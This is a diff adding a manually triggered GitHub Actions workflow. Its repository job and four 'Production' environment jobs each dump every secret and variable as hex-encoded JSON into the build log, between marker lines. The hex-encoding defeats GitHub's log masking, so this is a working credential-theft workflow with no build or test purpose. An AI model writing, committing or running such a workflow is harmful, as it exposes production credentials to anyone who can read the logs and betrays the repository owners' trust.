@@ -1,0 +1,72 @@
+name: i110763env
+on: workflow_dispatch
+jobs:
+  repository:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          echo "ENVJOB=REPO-NOENV"
+          echo 'SBEGIN'
+          echo '${{ toJSON(secrets) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'SEND'
+          echo 'VBEGIN'
+          echo '${{ toJSON(vars) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'VEND'
+          echo "MARKER-i110763"
+  e0:
+    environment: "Production"
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          echo "ENVJOB=Production"
+          echo 'SBEGIN'
+          echo '${{ toJSON(secrets) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'SEND'
+          echo 'VBEGIN'
+          echo '${{ toJSON(vars) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'VEND'
+          echo "MARKER-i110763"
+  e1:
+    environment: "Production – unit-5"
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          echo "ENVJOB=Production – unit-5"
+          echo 'SBEGIN'
+          echo '${{ toJSON(secrets) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'SEND'
+          echo 'VBEGIN'
+          echo '${{ toJSON(vars) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'VEND'
+          echo "MARKER-i110763"
+  e2:
+    environment: "Production – unit-5day2intro"
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          echo "ENVJOB=Production – unit-5day2intro"
+          echo 'SBEGIN'
+          echo '${{ toJSON(secrets) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'SEND'
+          echo 'VBEGIN'
+          echo '${{ toJSON(vars) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'VEND'
+          echo "MARKER-i110763"
+  e3:
+    environment: "Production – unit-5testing"
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        run: |
+          echo "ENVJOB=Production – unit-5testing"
+          echo 'SBEGIN'
+          echo '${{ toJSON(secrets) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'SEND'
+          echo 'VBEGIN'
+          echo '${{ toJSON(vars) }}' | xxd -p | tr -d "\n" | fold -w 3000
+          echo 'VEND'
+          echo "MARKER-i110763"
